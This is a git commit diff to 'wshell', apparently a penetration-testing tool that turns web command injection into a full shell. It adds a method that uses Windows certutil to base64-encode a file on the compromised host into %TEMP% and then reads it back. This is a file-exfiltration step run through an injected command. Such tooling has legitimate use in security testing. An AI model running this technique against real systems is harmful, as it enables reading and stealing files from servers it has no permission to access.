4e19282a358d90402b5b73e5bb8936ca65234d72
Francesco Marano <francesco.mrn24@gmail.com>
2020-12-06 03:15:33 +0100

    Add Windows CMD implementation of base64-based cat

--- wshell/injectors.py
+++ wshell/injectors.py
@@ -6,7 +6,7 @@ import requests
 from typing import Optional, Dict
 from urllib.parse import quote as url_encode
 
-from wshell import settings
+from wshell import settings, utils
 from wshell.errors import CommandExecutionError, OsDetectionError, TargetUnreachableError
 
 # Disable warnings related to unverified SSL certs
@@ -221,6 +221,22 @@ class WindowsCmdCommandInjector(CommandInjector):
     def get_prompt(self):
         # Outputs like "C:\Users\wshell>"
         return f"{self.current_directory()}> "
+
+    def base64_cat(self, filename: str) -> str:
+        random_filename = utils.random_string()
+        self.execute(f"certutil -encode '{filename}' %TEMP%/{random_filename}")
+        base64_output = self.execute(f"type %TEMP%/{random_filename}")
+
+        # `certutil` output will be something like:
+        #
+        # -----BEGIN CERTIFICATE-----
+        # V1NoZWxsIGxldHMgeW91IHR1cm4gYSB3ZWItYmFzZWQge2NvZGUsY29tbWFuZCx0ZW1wbGF0ZX0g
+        # aW5qZWN0aW9uIGluIGEgZnVsbCBmZWF0dXJlZCBzaGVsbCB3aXRoIGVhc2UuCg==
+        # -----END CERTIFICATE-----
+        #
+        # So, we need to remove the first and the last lines
+        #
+        return base64_output[1:-2]
 
 
 class WindowsPshCommandInjector(CommandInjector):
